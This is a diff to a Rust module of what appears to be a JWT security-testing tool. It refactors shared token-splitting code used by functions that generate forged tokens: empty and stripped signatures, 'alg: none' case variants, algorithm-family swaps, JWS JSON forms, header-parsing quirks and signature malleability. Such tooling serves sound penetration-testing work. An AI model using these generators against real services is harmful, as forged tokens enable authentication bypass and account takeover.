@@ -5,27 +5,62 @@ use log::info;
 use serde_json::json;
 use zeroize::Zeroize;
 
-/// Extract the claims (second) part from a JWT token string
-fn extract_claims_part(token: &str) -> Result<&str> {
+/// The three dot-separated segments of a compact JWT, borrowed from the source string.
+struct TokenParts<'a> {
+    /// base64url-encoded JOSE header (first segment).
+    header_b64: &'a str,
+    /// base64url-encoded claims/payload (second segment).
+    claims_part: &'a str,
+    /// base64url-encoded signature (third segment); empty when the token has none.
+    signature: &'a str,
+}
+
+/// Split a compact JWT into its header/claims/signature segments.
+///
+/// Errors with "Invalid token format" when fewer than two segments are present.
+/// A missing signature segment is reported as an empty string; any fourth or
+/// later segment is ignored, matching the historical `split('.')` behavior.
+fn split_token(token: &str) -> Result<TokenParts<'_>> {
     let parts: Vec<&str> = token.split('.').collect();
     if parts.len() < 2 {
         return Err(anyhow::anyhow!("Invalid token format"));
     }
-    Ok(parts[1])
+    Ok(TokenParts {
+        header_b64: parts[0],
+        claims_part: parts[1],
+        signature: parts.get(2).copied().unwrap_or(""),
+    })
 }
 
-/// Encode a JSON header and combine with claims part into a JWT-like string
+/// Extract the claims (second) part from a JWT token string
+fn extract_claims_part(token: &str) -> Result<&str> {
+    Ok(split_token(token)?.claims_part)
+}
+
+/// Decode a base64url JOSE header into a JSON value, falling back to
+/// `{"typ":"JWT"}` when the segment is not valid base64url or not valid JSON.
+fn decode_header_or_default(header_b64: &str) -> serde_json::Value {
+    general_purpose::URL_SAFE_NO_PAD
+        .decode(header_b64)
+        .ok()
+        .and_then(|bytes| serde_json::from_slice(&bytes).ok())
+        .unwrap_or_else(|| json!({ "typ": "JWT" }))
+}
+
+/// Encode a JSON header and combine with the claims part into a `header.payload`
+/// string. This doubles as the HMAC/asymmetric signing input, since the bytes
+/// signed are exactly the first two segments joined by a dot.
 fn encode_header_with_claims(header: &serde_json::Value, claims_part: &str) -> Result<String> {
     let header_json = serde_json::to_string(header)?;
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
     Ok(format!("{encoded_header}.{claims_part}"))
 }
 
-/// Build a header.payload signing input from a header JSON value and an existing claims part.
+/// Build a `header.payload` signing input from a header JSON value and an
+/// existing claims part. Alias of [`encode_header_with_claims`], named for use
+/// sites that treat the result as bytes-to-be-signed rather than a final token.
 fn build_signing_input(header: &serde_json::Value, claims_part: &str) -> Result<String> {
-    let header_json = serde_json::to_string(header)?;
-    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
-    Ok(format!("{encoded_header}.{claims_part}"))
+    encode_header_with_claims(header, claims_part)
 }
 
 /// Sign an arbitrary signing input with HS256 and return a JWT-formatted token (header.payload.sig).
@@ -345,8 +380,11 @@ pub fn generate_b64_payload(token: &str) -> Result<Vec<String>> {
 /// algorithm is not explicitly `none`. The original header is preserved so
 /// the server still sees its expected `alg`.
 pub fn generate_empty_sig_payload(token: &str) -> Result<Vec<String>> {
-    let claims_part = extract_claims_part(token)?;
-    let header_b64 = token.split('.').next().unwrap_or("");
+    let TokenParts {
+        header_b64,
+        claims_part,
+        ..
+    } = split_token(token)?;
 
     let payloads = vec![
         // Empty signature segment
@@ -884,13 +922,11 @@ pub fn generate_jwk_embed_ec_payload(token: &str) -> Result<String> {
 /// and a Flattened variant that adds an unprotected `header` with `alg: none`
 /// alongside the original `protected` header.
 pub fn generate_jws_json_payload(token: &str) -> Result<Vec<String>> {
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-    let original_header = parts[0];
-    let claims_part = parts[1];
-    let original_sig = parts.get(2).copied().unwrap_or("");
+    let TokenParts {
+        header_b64: original_header,
+        claims_part,
+        signature: original_sig,
+    } = split_token(token)?;
 
     let mut payloads = Vec::new();
 
@@ -944,21 +980,15 @@ pub fn generate_jws_json_payload(token: &str) -> Result<Vec<String>> {
 /// up. All other header fields (`kid`, `jwk`, `jku`, `x5u`, etc.) are
 /// preserved so the server still locates the same verification key.
 pub fn generate_alg_family_swap_payload(token: &str) -> Result<Vec<String>> {
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-    let claims_part = parts[1];
-    let original_sig = parts.get(2).copied().unwrap_or("");
+    let TokenParts {
+        header_b64: original_header_b64,
+        claims_part,
+        signature: original_sig,
+    } = split_token(token)?;
     let source_alg = original_alg(token).unwrap_or_else(|| "RS256".to_string());
 
     // Decode the original header so we can preserve kid/jwk/jku/x5u/etc.
-    let original_header_b64 = parts[0];
-    let original_header: serde_json::Value =
-        match general_purpose::URL_SAFE_NO_PAD.decode(original_header_b64) {
-            Ok(bytes) => serde_json::from_slice(&bytes).unwrap_or_else(|_| json!({ "typ": "JWT" })),
-            Err(_) => json!({ "typ": "JWT" }),
-        };
+    let original_header = decode_header_or_default(original_header_b64);
 
     // (target alg) variants depending on source family.
     let targets: &[&str] = match source_alg.to_uppercase().as_str() {
@@ -1007,12 +1037,11 @@ pub fn generate_alg_family_swap_payload(token: &str) -> Result<Vec<String>> {
 /// non-empty third segment as a sanity check. Provides a few flavours of
 /// signature bytes so callers can probe each branch.
 pub fn generate_none_with_sig_payload(token: &str) -> Result<Vec<String>> {
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-    let claims_part = parts[1];
-    let original_sig = parts.get(2).copied().unwrap_or("");
+    let TokenParts {
+        claims_part,
+        signature: original_sig,
+        ..
+    } = split_token(token)?;
 
     let mut payloads = Vec::new();
     for alg in ["none", "NONE", "None", "nOnE"] {
@@ -1038,12 +1067,11 @@ pub fn generate_none_with_sig_payload(token: &str) -> Result<Vec<String>> {
 /// Probes parsers that tolerate non-strict JSON or split tokens on first/last
 /// `.` instead of validating a 3-segment shape.
 pub fn generate_header_quirks_payload(token: &str) -> Result<Vec<String>> {
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-    let claims_part = parts[1];
-    let original_sig = parts.get(2).copied().unwrap_or("");
+    let TokenParts {
+        header_b64: original_header,
+        claims_part,
+        signature: original_sig,
+    } = split_token(token)?;
 
     // Raw headers with non-strict prefixes/suffixes.
     let raw_variants: &[&[u8]] = &[
@@ -1071,7 +1099,6 @@ pub fn generate_header_quirks_payload(token: &str) -> Result<Vec<String>> {
     }
 
     // 4th-segment trailing garbage on the original token.
-    let original_header = parts[0];
     if !original_sig.is_empty() {
         payloads.push(format!(
             "{original_header}.{claims_part}.{original_sig}.garbage"
@@ -1474,13 +1501,11 @@ fn left_pad_to(mut bytes: Vec<u8>, size: usize) -> Vec<u8> {
 /// signature, truncated signature, and a trailing-byte-extended signature —
 /// whose value is the verifier's differential response (accept / 500 / 400).
 pub fn generate_sig_malleability_payload(token: &str) -> Result<Vec<String>> {
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-    let header = parts[0];
-    let claims = parts[1];
-    let sig_b64 = parts.get(2).copied().unwrap_or("");
+    let TokenParts {
+        header_b64: header,
+        claims_part: claims,
+        signature: sig_b64,
+    } = split_token(token)?;
     let alg = original_alg(token).unwrap_or_default().to_uppercase();
 
     let mut payloads = Vec::new();
